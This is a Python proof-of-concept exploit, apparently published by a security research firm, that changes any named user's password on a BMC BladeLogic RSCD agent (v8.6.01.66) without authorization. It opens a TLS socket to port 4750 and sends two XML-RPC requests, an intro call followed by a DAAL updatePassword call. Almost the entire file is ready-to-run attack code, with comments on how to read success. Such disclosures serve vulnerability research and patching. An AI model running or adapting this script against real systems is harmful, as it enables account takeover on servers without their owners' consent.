# Demonstration of the unauthorized password change functionality with BMC BladeLogic RSCD agent v8.6.01.66
# Copyright: ERNW


import socket
import ssl
import sys
import argparse
import requests
from requests.packages.urllib3 import PoolManager, HTTPConnectionPool
#If you encounter problems with import, try to comment the previous line and use the following one instead
#from urllib3 import PoolManager, HTTPConnectionPool, connectionpool

try:
    from http.client import HTTPConnection
except ImportError:
    from httplib import HTTPConnection

class MyHTTPConnection(HTTPConnection):
    def connect(self):
        self.sock = wrappedSocket
        if self._tunnel_host:
            self._tunnel()

requests.packages.urllib3.connectionpool.HTTPConnection = MyHTTPConnection
#If you used the alternative import, comment the previous line and uncomment the following instead
#connectionpool.HTTPConnection = MyHTTPConnection

def optParser():
	parser = argparse.ArgumentParser(description="Test for password change with BMC BladeLogic Server Automation RSCD agent")
	parser.add_argument("host", help="IP address of a target system")
	parser.add_argument("-p", "--port", type=int, default=4750, help="TCP port (default: 4750)")
	parser.add_argument("user", help="User whom the password belongs to")
	parser.add_argument("password", help="New password")
	opts=parser.parse_args()
	return opts

def sendXMLRPC(host,port,packet):
	r=requests.post('http://'+host+':'+str(port)+'/xmlrpc',data=packet)
	print r.status_code
	print r.content
	return

# Server introduction request

intro = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2016-1-14-18-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>"""
options=optParser()
user=options.user
newPass=options.password
PORT=options.port
HOST=options.host

# Request to update password of a specific user

updatePwd = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.performAction</methodName><params><param><value><struct><member><name>typeName</name><value>BMC_UnixUser</value></member><member><name>host</name><value>0.0.0.0</value></member><member><name>container</name><value><array><data><value><struct><member><name>string</name><value>IS_LIVE</value></member><member><name>value</name><value><struct><member><name>longValue</name><value><ex:i8>1</ex:i8></value></member><member><name>kind</name><value><i4>1</i4></value></member></struct></value></member></struct></value></data></array></value></member><member><name>path</name><value>/"""+str(user)+"""</value></member></struct></value></param><param><value>updatePassword</value></param><param><value><array><data><value><struct><member><name>string</name><value>newPassword</value></member><member><name>value</name><value><struct><member><name>stringValue</name><value>"""+str(newPass)+"""</value></member><member><name>kind</name><value><i4>2</i4></value></member></struct></value></member></struct></value></data></array></value></param><param><value><boolean>0</boolean></value></param></params></methodCall>"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

# Initial packet which will trigger XMLRPC communication
sock.sendall("TLSRPC")
wrappedSocket = ssl.wrap_socket(sock)

# Sending both XMLRPC requests
# Important: response to the first request might be "No authorization to access host". 
# That does not mean that the second request will not work!
# When the response to the second request is errorCode 0 - it worked

sendXMLRPC(HOST,PORT,intro)
sendXMLRPC(HOST,PORT,updatePwd)

wrappedSocket.close()

